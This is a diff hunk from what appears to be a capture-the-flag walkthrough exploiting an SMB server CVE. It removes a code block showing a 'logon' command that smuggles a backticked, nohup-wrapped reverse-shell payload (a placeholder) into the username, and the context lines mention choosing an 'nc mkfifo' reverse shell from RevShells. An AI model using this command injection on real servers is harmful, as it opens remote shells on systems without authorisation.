@@ -333,13 +333,6 @@ Then, I'll choose the 'nc mkfifo' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
-Therefore, after logging in to the SMB server, the command we should enter to
-exploit this CVE is:
-
-```sh
-logon "/`nohup <REVSHELL_PAYLOAD>`"
-```
-
 ### Exploitation
 
 Let's connect to the SMB server and access the only share we have access to,
